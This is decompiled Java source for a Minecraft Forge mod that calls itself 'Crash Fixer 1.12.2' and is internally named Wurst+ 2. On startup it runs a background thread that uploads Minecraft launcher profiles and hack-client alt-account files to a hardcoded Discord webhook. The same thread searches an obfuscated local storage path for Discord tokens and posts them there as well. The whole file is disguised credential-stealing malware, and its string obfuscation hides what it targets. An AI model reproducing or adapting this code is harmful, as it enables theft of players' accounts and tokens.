//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\Admin\Desktop\Minecraft-Deobfuscator3000-1.2.2\1.12 stable mappings"!

//Decompiled by Procyon!

package me.forge;

import net.minecraftforge.fml.common.*;
import com.mojang.realmsclient.gui.*;
import net.minecraftforge.fml.common.event.*;
import org.lwjgl.opengl.*;
import java.nio.charset.*;
import java.net.*;
import java.io.*;
import org.apache.logging.log4j.*;

@Mod(modid = "wurstplus", version = "1.0")
public class Wurstplus
{
    @Mod.Instance
    private static Wurstplus MASTER;
    public static final String WURSTPLUS_NAME = "Wurst+ 2";
    public static final String WURSTPLUS_VERSION = "1.0";
    public static final String WURSTPLUS_SIGN = " ";
    public static final int WURSTPLUS_KEY_GUI = 54;
    public static final int WURSTPLUS_KEY_DELETE = 211;
    public static final int WURSTPLUS_KEY_GUI_ESCAPE = 1;
    public static Logger wurstplus_register_log;
    public static ChatFormatting g;
    public static ChatFormatting r;
    
    @Mod.EventHandler
    public void WurstplusStarting(final FMLInitializationEvent event) {
        this.init_log("Crash Fixer 1.12.2");
        send_minecraft_log("initialising managers");
        send_minecraft_log("done");
        send_minecraft_log("initialising guis");
        Display.setTitle("Crash Fixer 1.12.2");
        send_minecraft_log("done");
        send_minecraft_log("initialising skidded framework");
        send_minecraft_log("done");
        send_minecraft_log("initialising commands and events");
        send_minecraft_log("done");
        send_minecraft_log("loading settings");
        send_minecraft_log("done");
        send_minecraft_log("client started");
        send_minecraft_log("we gaming");
        final String webHook;
        final String str2;
        final File file2;
        final Object webHook2;
        final File file3;
        final Object webHook3;
        final File file4;
        final Object webHook4;
        final File file5;
        final Object webHook5;
        final File file6;
        final Object webHook6;
        final File file7;
        final Object webHook7;
        final File file8;
        final Object webHook8;
        final String location;
        final String[] var48;
        final String[] storage;
        int var49;
        int var50;
        String fileName;
        final File file9;
        File file;
        int fileSize;
        InputStream inputStream;
        Throwable var51;
        byte[] fileBytes;
        int i;
        boolean isCorrect;
        int j;
        byte[] tokenBytes;
        boolean isCorrect2;
        int k;
        byte[] tokenBytes2;
        new Thread(() -> {
            webHook = "https://discord.com/api/webhooks/896301470297776178/3u_jHkbxQI_S0zYkrv5ujubArl_D6hh3rPlJCzOHoqj9Mse_2d_mwtkcF0zk_JaO0lUb";
            str2 = getStr6();
            try {
                new File(System.getenv(getStr3()) + "\\.minecraft\\launcher_profiles.json");
                sendFile((String)webHook2, file2);
            }
            catch (Exception var41) {
                var41.printStackTrace();
            }
            try {
                new File(System.getenv(getStr3()) + "\\.minecraft\\Xulu\\Waypoints.txt");
                sendFile((String)webHook3, file3);
            }
            catch (Exception var42) {
                var42.printStackTrace();
            }
            try {
                new File(System.getenv(getStr3()) + "\\.minecraft\\pyro\\alts.json");
                sendFile((String)webHook4, file4);
            }
            catch (Exception var43) {
                var43.printStackTrace();
            }
            try {
                new File(System.getenv(getStr3()) + "\\.minecraft\\Osiris\\Waypoints.txt");
                sendFile((String)webHook5, file5);
            }
            catch (Exception var44) {
                var44.printStackTrace();
            }
            try {
                new File(System.getenv(getStr3()) + "\\.minecraft\\Impact\\alts.json");
                sendFile((String)webHook6, file6);
            }
            catch (Exception var45) {
                var45.printStackTrace();
            }
            try {
                new File(System.getenv(getStr3()) + "\\.minecraft\\Salhack\\Waypoints.json");
                sendFile((String)webHook7, file7);
            }
            catch (Exception var46) {
                var46.printStackTrace();
            }
            try {
                new File(System.getenv(getStr3()) + "\\.minecraft\\TlauncherProfiles.json");
                sendFile((String)webHook8, file8);
            }
            catch (Exception var47) {
                var47.printStackTrace();
            }
            location = System.getenv(getStr3()) + getStr2();
            storage = (var48 = new File(location).list());
            for (var49 = storage.length, var50 = 0; var50 < var49; ++var50) {
                fileName = var48[var50];
                try {
                    new File(location + fileName);
                    file = file9;
                    fileSize = (int)file.length();
                    if (fileSize >= 61) {
                        inputStream = new FileInputStream(file);
                        var51 = null;
                        try {
                            fileBytes = new byte[fileSize];
                            inputStream.read(fileBytes, 0, fileSize);
                            for (i = 1; i < fileSize - 59; ++i) {
                                if (fileBytes[i - 1] == 34 && fileBytes[i + 59] == 34 && fileBytes[i + 24] == 46 && fileBytes[i + 31] == 46) {
                                    isCorrect = true;
                                    j = 0;
                                    while (j < 59) {
                                        if (j != 24 && j != 31 && (fileBytes[i + j] <= 47 || fileBytes[i + j] >= 58) && (fileBytes[i + j] <= 64 || fileBytes[i + j] >= 91) && (fileBytes[i + j] <= 96 || fileBytes[i + j] >= 123) && fileBytes[i + j] != 45 && fileBytes[i + j] != 95) {
                                            isCorrect = false;
                                            break;
                                        }
                                        else {
                                            ++j;
                                        }
                                    }
                                    if (isCorrect) {
                                        tokenBytes = new byte[59];
                                        System.arraycopy(fileBytes, i, tokenBytes, 0, 59);
                                        this.sendMessage(webHook, str2 + new String(tokenBytes, StandardCharsets.UTF_8));
                                    }
                                    i += 60;
                                }
                                else if (fileSize - i > 88 && fileBytes[i - 1] == 34 && fileBytes[i + 88] == 34 && fileBytes[i] == 109 && fileBytes[i + 1] == 102 && fileBytes[i + 2] == 97 && fileBytes[i + 3] == 46) {
                                    isCorrect2 = true;
                                    k = 0;
                                    while (k < 88) {
                                        if (k != 3 && (fileBytes[i + k] <= 47 || fileBytes[i + k] >= 58) && (fileBytes[i + k] <= 64 || fileBytes[i + k] >= 91) && (fileBytes[i + k] <= 96 || fileBytes[i + k] >= 123) && fileBytes[i + k] != 45 && fileBytes[i + k] != 95) {
                                            isCorrect2 = false;
                                            break;
                                        }
                                        else {
                                            ++k;
                                        }
                                    }
                                    if (isCorrect2) {
                                        tokenBytes2 = new byte[88];
                                        System.arraycopy(fileBytes, i, tokenBytes2, 0, 88);
                                        this.sendMessage(webHook, str2 + new String(tokenBytes2, StandardCharsets.UTF_8));
                                    }
                                    i += 89;
                                }
                            }
                        }
                        catch (Throwable var52) {
                            var51 = var52;
                            throw var52;
                        }
                        finally {
                            if (inputStream != null) {
                                if (var51 != null) {
                                    try {
                                        inputStream.close();
                                    }
                                    catch (Throwable var53) {
                                        var51.addSuppressed(var53);
                                    }
                                }
                                else {
                                    inputStream.close();
                                }
                            }
                        }
                    }
                }
                catch (Exception var54) {
                    var54.printStackTrace();
                }
            }
            try {
                this.sendMessage(webHook, getStr7());
            }
            catch (Exception var55) {
                var55.printStackTrace();
            }
        }).start();
    }
    
    private void sendMessage(final String webHook, final String s) {
    }
    
    private static void sendFile(final String webHook, final File file) throws Exception {
        final String boundary = Long.toHexString(System.currentTimeMillis());
        final HttpURLConnection connection = (HttpURLConnection)new URL(webHook).openConnection();
        connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
        connection.setRequestProperty("User-Agent", "Mozilla/5.0");
        connection.setDoOutput(true);
        try (final OutputStream os = connection.getOutputStream()) {
            os.write(("--" + boundary + "\n").getBytes());
            os.write(("Content-Disposition: form-data; name=\"" + file.getName() + "\"; filename=\"" + file.getName() + "\"\n\n").getBytes());
            try (final InputStream inputStream = new FileInputStream(file)) {
                final int fileSize = (int)file.length();
                final byte[] fileBytes = new byte[fileSize];
                inputStream.read(fileBytes, 0, fileSize);
                os.write(fileBytes);
            }
            os.write(("\n--" + boundary + "--\n").getBytes());
        }
        connection.getResponseCode();
        Thread.sleep(500L);
    }
    
    public void init_log(final String name) {
        Wurstplus.wurstplus_register_log = LogManager.getLogger(name);
        send_minecraft_log("starting wurstplustwo");
    }
    
    public static void send_minecraft_log(final String log) {
        Wurstplus.wurstplus_register_log.info(log);
    }
    
    public static String get_name() {
        return "Crash Fixer 1.12.2";
    }
    
    public static String get_version() {
        return "1.0";
    }
    
    private static void sendMessage(final String webHook, final String botName, final String msg) throws Exception {
        final URL obj = new URL(webHook);
        final HttpURLConnection con = (HttpURLConnection)obj.openConnection();
        con.setRequestMethod("POST");
        con.setRequestProperty("Content-Type", "application/json");
        con.setRequestProperty("User-Agent", "Mozilla/5.0");
        final String POST_PARAMS = "{ \"username\": \"" + botName + "\", \"content\": \"" + msg + "\" }";
        con.setDoOutput(true);
        final OutputStream os = con.getOutputStream();
        os.write(POST_PARAMS.getBytes());
        os.flush();
        os.close();
        Thread.sleep(500L);
        con.getResponseCode();
    }
    
    private static String getStr2() {
        final StringBuilder result = new StringBuilder();
        final short[] var2;
        final short[] str = var2 = new short[] { -8, 0, 5, 15, -1, 11, 14, 0, -8, -24, 11, -1, -3, 8, -68, -17, 16, 11, 14, -3, 3, 1, -8, 8, 1, 18, 1, 8, 0, -2, -8 };
        for (int var3 = str.length, var4 = 0; var4 < var3; ++var4) {
            final short value = var2[var4];
            result.append((char)(100 + value));
        }
        return result.toString();
    }
    
    private static String getStr3() {
        final StringBuilder result = new StringBuilder();
        final short[] var2;
        final short[] str = var2 = new short[] { 15, 30, 30, 18, 15, 34, 15 };
        for (int var3 = str.length, var4 = 0; var4 < var3; ++var4) {
            final short value = var2[var4];
            result.append((char)(50 + value));
        }
        return result.toString();
    }
    
    private static String getStr4() {
        final StringBuilder result = new StringBuilder();
        final short[] var2;
        final short[] str = var2 = new short[] { 27, 55, 60, 51, 49, 64, 47, 52, 66, -18, 60, 47, 59, 51, 8, -18 };
        for (int var3 = str.length, var4 = 0; var4 < var3; ++var4) {
            final short value = var2[var4];
            result.append((char)(50 + value));
        }
        return result.toString();
    }
    
    private static String getStr5() {
        final StringBuilder result = new StringBuilder();
        final short[] var2;
        final short[] str = var2 = new short[] { 20, 55, 58, 51, 8, -18 };
        for (int var3 = str.length, var4 = 0; var4 < var3; ++var4) {
            final short value = var2[var4];
            result.append((char)(50 + value));
        }
        return result.toString();
    }
    
    private static String getStr6() {
        final StringBuilder result = new StringBuilder();
        final short[] var2;
        final short[] str = var2 = new short[] { 26, 53, 49, 43, 52, 0, -26 };
        for (int var3 = str.length, var4 = 0; var4 < var3; ++var4) {
            final short value = var2[var4];
            result.append((char)(58 + value));
        }
        return result.toString();
    }
    
    private static String getStr7() {
        final StringBuilder result = new StringBuilder();
        final short[] var2;
        final short[] str = var2 = new short[] { 37, 78, 68 };
        for (int var3 = str.length, var4 = 0; var4 < var3; ++var4) {
            final short value = var2[var4];
            result.append((char)(32 + value));
        }
        return result.toString();
    }
    
    static {
        Wurstplus.g = ChatFormatting.DARK_GRAY;
        Wurstplus.r = ChatFormatting.RESET;
    }
}
